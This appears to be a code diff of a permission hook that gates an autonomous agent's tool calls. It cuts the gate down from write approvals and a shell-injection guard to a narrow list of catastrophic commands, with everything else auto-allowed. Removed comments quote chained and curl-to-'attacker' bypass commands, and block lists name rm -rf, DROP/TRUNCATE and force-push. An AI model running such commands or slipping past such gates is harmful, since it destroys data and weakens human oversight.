@@ -1,213 +1,52 @@
 /**
  * god-mode-permission-gate — the box-side PreToolUse hook for the god-mode lane.
  *
- * Phase 2 of docs/brain/specs/god-mode.md. Wired into the `claude -p` invocation
- * for `kind='god-mode'` via `--settings` inline JSON that carries a PreToolUse
- * hook pointing at this script (runGodModeJob in scripts/builder-worker.ts).
+ * CEO-grade model (docs/brain/lifecycles/god-mode.md). God-mode is the founder's
+ * chief-of-staff with near-unlimited autonomy: it does ALL ordinary work with NO
+ * approval — writing code + scripts, running database queries, investigating,
+ * editing files, opening PRs, committing, ordinary shell. Writing a script is
+ * ALWAYS free even if the script's contents are destructive; the approval, when
+ * needed, is on EXECUTING something catastrophic, not on authoring it.
  *
- * Contract (Claude Code hooks):
- *   • stdin  — JSON: { session_id, tool_name, tool_input, ... } (Claude Code
- *              PreToolUse event payload).
- *   • env    — GOD_MODE_SESSION_ID is set by runGodModeJob to the god-mode
- *              session UUID (NOT the Claude session id) so the gate can insert
- *              approval rows and poll them.
- *   • stdout — JSON: { hookSpecificOutput: { hookEventName: "PreToolUse",
- *              permissionDecision: "allow"|"deny", permissionDecisionReason: "..." } }
- *              For an 'asked' outcome we return `deny` with the founder's
- *              question in `permissionDecisionReason` so the box reads it and
- *              can respond in-transcript (a live back-and-forth, not dead end).
- *   • exit   — 0 always (we express the decision via the JSON envelope).
+ * This gate is therefore a THIN, DETERMINISTIC FLOOR. It gates exactly ONE thing:
+ * a Bash command that matches the CATASTROPHIC rail (dropping tables, wiping data,
+ * mass-deleting rows, rm -rf, force-push, resetting the prod DB). Those land a
+ * `risk='destructive'` card and BLOCK until the founder approves WITH their PIN.
+ * Everything else auto-allows.
  *
- * Behavior:
- *   • SAFE — Read/Grep/Glob/WebSearch/WebFetch, an allowlist of read-only Bash
- *            prefixes (git status/diff/log, ls, cat, pwd, npx tsc, wc, head,
- *            tail, find, printf, node -v, npm -v, SELECT-only psql). Auto-allow;
- *            no god_mode_approvals row is inserted.
- *   • WRITE — everything else that isn't destructive. Inserts a god_mode_approvals
- *            row (status='pending', risk='write'), polls until it flips, returns
- *            allow on 'approved' and deny on 'denied'.
- *   • DESTRUCTIVE — matches a deterministic rail (drop/delete/truncate/force-push
- *            /rm -rf, DROP/TRUNCATE/DELETE FROM SQL). Same insert + poll, but
- *            risk='destructive'. The Phase-3 approve route verifies the founder
- *            PIN against workspaces.god_mode_pin_hash before flipping to
- *            'approved' — this gate just waits for the row to be resolved.
- *   • ASK — the founder answered with a question. We return deny WITH the
- *           question text in the reason so the box reads it and replies in
- *           transcript, then re-requests approval on the next tool call.
+ * The other half of the model — routing genuine CEO-grade DECISIONS to the founder
+ * in plain language ("ok to ship this hotfix?", "ok to dismiss these?") — is NOT
+ * done here. The BOX raises those itself, by judgment, via
+ * `scripts/god-mode-plan.ts decide` (a plain-language `risk='decision'` card, which
+ * this gate simply allows since it's an ordinary non-catastrophic call). The gate
+ * is the safety backstop; the box's judgment is the primary supervisor.
  *
- * If the session has been disarmed while a tool call was in-flight, the gate
- * denies (belt-and-suspenders — the runGodModeJob turn ends anyway).
+ * Contract (Claude Code hooks): stdin = PreToolUse JSON {tool_name, tool_input};
+ * env GOD_MODE_SESSION_ID; stdout = {hookSpecificOutput:{permissionDecision}}; exit 0.
  */
 import "./_bootstrap";
 import { createAdminClient } from "./_bootstrap";
-import {
-  openApproval,
-  getApproval,
-  isSessionArmed,
-  getActivePlan,
-  type GodModeApprovalRisk,
-} from "../src/lib/god-mode";
+import { openApproval, getApproval, isSessionArmed, type GodModeApprovalRisk } from "../src/lib/god-mode";
 
-// ── Read-only Bash prefixes — the safe subset that auto-allows without ─────
-// ── landing a god_mode_approvals row. Extend cautiously; every entry is a ──
-// ── surface that runs against the box unattended.                         ──
-const SAFE_BASH_PREFIXES: readonly string[] = [
-  "git status",
-  "git diff",
-  "git log",
-  "git show",
-  "git branch",
-  "git remote -v",
-  "git ls-files",
-  "git ls-remote",
-  "git rev-parse",
-  "git config --get",
-  "ls",
-  "cat",
-  "pwd",
-  "wc",
-  "head",
-  "tail",
-  "find ",
-  "which ",
-  "printf",
-  "node -v",
-  "node --version",
-  "npm -v",
-  "npm --version",
-  "npx tsc --noEmit",
-  "npx tsc --version",
-  "grep ",
-  "rg ",
-  "gh pr list",
-  "gh pr view",
-  "gh issue list",
-  "gh issue view",
-  "gh run list",
-  "gh run view",
+// ── The CATASTROPHIC floor — the ONLY things this gate blocks. Narrow by design:
+// truly irreversible / company-endangering actions. Each pairs with a plain-language
+// description the founder sees (never the raw command as the headline). Matched over
+// the Bash command text; false positives are safe (harder to run), false negatives
+// are the risk — so keep the set tight but the box's own judgment covers the rest.
+const CATASTROPHIC: readonly { re: RegExp; plain: string }[] = [
+  { re: /\brm\s+-[rf]*(r[rf]*f|f[rf]*r)[rf]*\b/i, plain: "Permanently delete files or folders — this cannot be undone." },
+  { re: /\bDROP\s+(TABLE|DATABASE|SCHEMA|INDEX|POLICY|VIEW|FUNCTION|COLUMN|TYPE|SEQUENCE)\b/i, plain: "Drop a database object (table/schema/etc.) — destroys its data permanently." },
+  { re: /\bTRUNCATE\b/i, plain: "Wipe every row from a database table — this cannot be undone." },
+  // DELETE FROM with NO WHERE clause = a mass delete. A targeted DELETE … WHERE is
+  // ordinary work and auto-allows (the box escalates a plain decision if it's a big call).
+  { re: /\bDELETE\s+FROM\b(?![\s\S]*\bWHERE\b)/i, plain: "Delete ALL rows from a database table (no filter) — this cannot be undone." },
+  { re: /\bgit\s+push\s+.*(--force\b|--force-with-lease\b|-f\b)/i, plain: "Force-push to git — this can permanently overwrite history and lose commits." },
+  { re: /\bsupabase\s+db\s+reset\b/i, plain: "Reset the database — destroys ALL data." },
 ];
 
-// ── Read-only tool names that never need approval. ─────────────────────────
-const SAFE_TOOLS = new Set<string>([
-  "Read",
-  "Grep",
-  "Glob",
-  "WebSearch",
-  "WebFetch",
-  "TodoWrite",
-  "TaskCreate",
-  "TaskUpdate",
-  "TaskList",
-  "TaskGet",
-]);
-
-// ── Destructive-command rails (regex over the command text). Rough but ────
-// ── deterministic — the founder can still approve; this only routes the ───
-// ── card to risk='destructive' so the PIN gate applies. False positives ────
-// ── are safe (harder to approve); false negatives are the real risk.  ─────
-const DESTRUCTIVE_PATTERNS: readonly RegExp[] = [
-  /\brm\s+-[rf]+\b/i,
-  /\brm\s+-r\s+-f\b/i,
-  /\brmdir\b/i,
-  /\bgit\s+push\s+.*--force\b/i,
-  /\bgit\s+push\s+-f\b/i,
-  /\bgit\s+reset\s+--hard\b/i,
-  /\bgit\s+clean\s+-f\b/i,
-  /\bgit\s+branch\s+-D\b/i,
-  /\bDROP\s+(TABLE|DATABASE|SCHEMA|INDEX|COLUMN|POLICY|VIEW|FUNCTION)\b/i,
-  /\bTRUNCATE\b/i,
-  /\bDELETE\s+FROM\b/i,
-  /\bALTER\s+TABLE\s+.*\s+DROP\b/i,
-  /\bshutdown\b/i,
-  // supabase / prod DB deploy commands
-  /\bsupabase\s+db\s+(reset|push)\b/i,
-  // vercel prod deploys
-  /\bvercel\s+.*(--prod|deploy\s+--prod)\b/i,
-];
-
-// Shell metacharacters that permit chaining, redirection, subshell, or command
-// substitution. If ANY of these appear in a command, the "prefix looks safe"
-// heuristic can't guarantee safety anymore — a chained `ls; rm -rf /tmp`
-// slipped through the old prefix-match. Fail-closed on any of these.
-//   ; & |  → command chaining / pipelines
-//   ` $(   → command substitution
-//   > <    → redirection (could clobber, could exfil)
-//   \n     → newline-embedded second statement
-const SHELL_METACHAR_RE = /[;&|`$<>\n]|\$\(/;
-
-// The god-mode plan primitive (scripts/god-mode-plan.ts open|close|status) is
-// allowlisted: invoking it must NOT itself land a card, because its whole job is
-// to raise the ONE plan card and poll it internally. Anchored at the start (an
-// optional path prefix before scripts/) + a known subcommand; the shell-
-// metachar guard below still rejects any `$`/`;`/backtick in the title/steps.
-const PLAN_CMD_RE = /^npx\s+tsx\s+(\S*\/)?scripts\/god-mode-plan\.ts\s+(open|close|status)\b/;
-
-function isSafeBash(command: string): boolean {
-  const c = command.trim();
-  // The plan primitive — allow it (but still reject shell metacharacters so a
-  // title carrying `$(…)` can't smuggle a subshell past the allowlist).
-  if (PLAN_CMD_RE.test(c)) return !SHELL_METACHAR_RE.test(c);
-  // psql with a plain SELECT is safe. Anything containing a semicolon-separated
-  // second statement or SQL keywords other than SELECT is not.
-  if (/^psql\b/i.test(c)) {
-    // Extract the -c payload (best-effort). If it's a SELECT only, allow.
-    const m = c.match(/-c\s+['"](.+)['"]/);
-    if (m) {
-      const sql = m[1].trim();
-      if (/^select\b/i.test(sql) && !/;\s*\S/.test(sql)) return true;
-      return false;
-    }
-    return false;
-  }
-  // Whole-command must fall UNDER an allowlist prefix — either the exact
-  // prefix or `prefix<space>...`. The previous `c.startsWith(prefix)` clause
-  // (no trailing space) was the bypass vector: `ls;rm -rf /` prefix-matched
-  // `ls` and slipped through as "safe". Removed.
-  const matchedPrefix = SAFE_BASH_PREFIXES.some((prefix) => c === prefix || c.startsWith(prefix + " "));
-  if (!matchedPrefix) return false;
-  // Even under an allowlisted prefix, reject any shell metacharacter that
-  // permits chaining / substitution / redirection. `ls; rm -rf /tmp` and
-  // `ls && cat /etc/passwd` and `cat "$(curl attacker)"` all fail here.
-  if (SHELL_METACHAR_RE.test(c)) return false;
-  return true;
-}
-
-function isDestructive(command: string): boolean {
-  return DESTRUCTIVE_PATTERNS.some((re) => re.test(command));
-}
-
-function classify(toolName: string, toolInput: Record<string, unknown>): {
-  decision: "safe" | "needs_approval";
-  risk: GodModeApprovalRisk;
-  preview: string;
-} {
-  if (SAFE_TOOLS.has(toolName)) {
-    return { decision: "safe", risk: "safe", preview: toolName };
-  }
-  if (toolName === "Bash") {
-    const command = typeof toolInput.command === "string" ? toolInput.command : "";
-    if (!command) return { decision: "needs_approval", risk: "write", preview: "Bash (no command)" };
-    // Belt-and-suspenders: even under isSafeBash-true, if the destructive rail
-    // matches, force needs_approval risk='destructive'. Guards against a novel
-    // destructive-command shape that slipped into an allowlisted prefix (e.g.
-    // `git branch -D main` — `git branch` is allowlisted but the `-D` deletes).
-    // The PIN gate on the destructive approval remains the enforcement point.
-    if (isDestructive(command)) {
-      return { decision: "needs_approval", risk: "destructive", preview: `Bash: ${command}` };
-    }
-    if (isSafeBash(command)) return { decision: "safe", risk: "safe", preview: `Bash: ${command}` };
-    return { decision: "needs_approval", risk: "write", preview: `Bash: ${command}` };
-  }
-  if (toolName === "Write" || toolName === "Edit") {
-    const path = typeof toolInput.file_path === "string" ? toolInput.file_path : "?";
-    return { decision: "needs_approval", risk: "write", preview: `${toolName} ${path}` };
-  }
-  if (toolName === "NotebookEdit") {
-    const path = typeof toolInput.notebook_path === "string" ? toolInput.notebook_path : "?";
-    return { decision: "needs_approval", risk: "write", preview: `NotebookEdit ${path}` };
-  }
-  // Unknown tool — default to needs-approval (fail-safe).
-  return { decision: "needs_approval", risk: "write", preview: `${toolName} (unknown tool)` };
+function catastrophic(command: string): { plain: string } | null {
+  for (const c of CATASTROPHIC) if (c.re.test(command)) return { plain: c.plain };
+  return null;
 }
 
 async function readStdin(): Promise<string> {
@@ -235,10 +74,7 @@ function emit(decision: "allow" | "deny", reason: string): never {
 
 async function main() {
   const sessionId = process.env.GOD_MODE_SESSION_ID;
-  if (!sessionId) {
-    // Fail closed — no way to record a decision without a session context.
-    emit("deny", "god-mode gate: GOD_MODE_SESSION_ID not set (bug — the runner must set this)");
-  }
+  if (!sessionId) emit("deny", "god-mode gate: GOD_MODE_SESSION_ID not set (bug — the runner must set this)");
 
   const raw = await readStdin();
   let payload: { tool_name?: string; tool_input?: Record<string, unknown> } = {};
@@ -248,38 +84,24 @@ async function main() {
     emit("deny", "god-mode gate: could not parse PreToolUse payload");
   }
   const toolName = typeof payload.tool_name === "string" ? payload.tool_name : "";
-  const toolInput =
-    payload.tool_input && typeof payload.tool_input === "object" ? payload.tool_input : {};
+  const toolInput = payload.tool_input && typeof payload.tool_input === "object" ? payload.tool_input : {};
 
   const admin = createAdminClient();
 
-  // If the founder disarmed the session mid-call, deny fast. The runGodModeJob
-  // stream also detects this and tears down, but the belt-and-suspenders here
-  // keeps a mid-turn tool from executing after disarm.
-  if (!(await isSessionArmed(admin, sessionId!))) {
-    emit("deny", "god mode is disarmed — call not allowed");
+  // If the founder disarmed mid-call, deny fast (belt-and-suspenders — the turn ends anyway).
+  if (!(await isSessionArmed(admin, sessionId!))) emit("deny", "god mode is disarmed — call not allowed");
+
+  // The ONLY gated path: a Bash command on the catastrophic floor. Everything else
+  // — writes, edits, scripts, DB queries, ordinary shell, git, PRs, MCP/unknown
+  // tools — auto-allows. Writing a script is always free (even destructive contents);
+  // only EXECUTING a catastrophic command lands here.
+  const command = toolName === "Bash" && typeof toolInput.command === "string" ? toolInput.command : "";
+  const cat = command ? catastrophic(command) : null;
+  if (!cat) {
+    emit("allow", `god-mode gate: auto-allowed (${toolName || "tool"})`);
   }
 
-  const cls = classify(toolName, toolInput);
-  if (cls.decision === "safe") {
-    emit("allow", `god-mode gate: auto-allowed (${cls.preview})`);
-  }
-
-  // Plan-scoped auto-allow (hotfix): while the founder has an APPROVED plan open
-  // for this session, the non-destructive mechanical calls that implement it flow
-  // without a fresh card — the founder approved the DECISION once. Destructive
-  // calls NEVER batch under a plan; they fall through to the PIN gate below. The
-  // plan's own open/close/status invocation is already safe above, so it never
-  // reaches here. The Chat tab still streams every call live, and disarm kills
-  // the session mid-flight — so the batch stays supervisable.
-  if (cls.risk !== "destructive") {
-    const plan = await getActivePlan(admin, sessionId!);
-    if (plan) {
-      emit("allow", `god-mode gate: auto-allowed under approved plan ${plan.id.slice(0, 8)} — ${cls.preview}`);
-    }
-  }
-
-  // Land the approval row and poll until the founder decides.
+  // Land the catastrophic-approval card and poll until the founder decides (with PIN).
   const { data: session } = await admin
     .from("god_mode_sessions")
     .select("workspace_id")
@@ -287,49 +109,38 @@ async function main() {
     .maybeSingle();
   if (!session) emit("deny", "god-mode gate: session not found");
 
+  const risk: GodModeApprovalRisk = "destructive";
   const row = await openApproval(admin, {
     sessionId: sessionId!,
     workspaceId: (session as { workspace_id: string }).workspace_id,
     toolName,
     toolInput,
-    preview: cls.preview,
-    risk: cls.risk,
+    // Plain-language headline + the raw command underneath, so the founder decides
+    // on the CONSEQUENCE, not the syntax.
+    preview: `${cat.plain}\n\nCommand: ${command}`,
+    risk,
   });
 
-  // Poll. No hard cap — a founder may sleep on it; the outer session timeout
-  // is what kills a truly forgotten call. If the session disarms while
-  // polling, exit deny.
   const POLL_MS = 2000;
   // eslint-disable-next-line no-constant-condition
   while (true) {
     await new Promise((r) => setTimeout(r, POLL_MS));
     const fresh = await getApproval(admin, row.id);
     if (!fresh) emit("deny", "god-mode gate: approval row disappeared");
-    if (fresh.status === "pending") {
-      // If the session was disarmed while we were waiting, bail.
-      if (!(await isSessionArmed(admin, sessionId!))) {
-        emit("deny", "god mode was disarmed while waiting for approval");
-      }
+    if (fresh!.status === "pending") {
+      if (!(await isSessionArmed(admin, sessionId!))) emit("deny", "god mode was disarmed while waiting for approval");
       continue;
     }
-    if (fresh.status === "approved") {
-      emit("allow", `god-mode gate: approved (${fresh.risk})`);
-    }
-    if (fresh.status === "denied") {
-      emit("deny", `god-mode gate: denied (${fresh.risk})`);
-    }
-    if (fresh.status === "asked") {
-      // Return deny WITH the question so the box reads it in the reason and
-      // can respond in-transcript. The Phase-3 UI is what surfaces the ask;
-      // this text is what the box sees inline.
-      const q = fresh.question_text ?? "(no question text)";
-      emit("deny", `god-mode gate: the founder asked — "${q}" — respond in transcript, then re-request this tool.`);
+    if (fresh!.status === "approved") emit("allow", "god-mode gate: approved (with PIN)");
+    if (fresh!.status === "denied") emit("deny", "god-mode gate: the founder declined this action");
+    if (fresh!.status === "asked") {
+      const q = fresh!.question_text ?? "(no question text)";
+      emit("deny", `god-mode gate: the founder asked — "${q}" — answer in your reply, then re-request if still needed.`);
     }
   }
 }
 
 main().catch((err) => {
-  // Any thrown error → fail closed.
   try {
     emit("deny", `god-mode gate error: ${err instanceof Error ? err.message : String(err)}`);
   } catch {
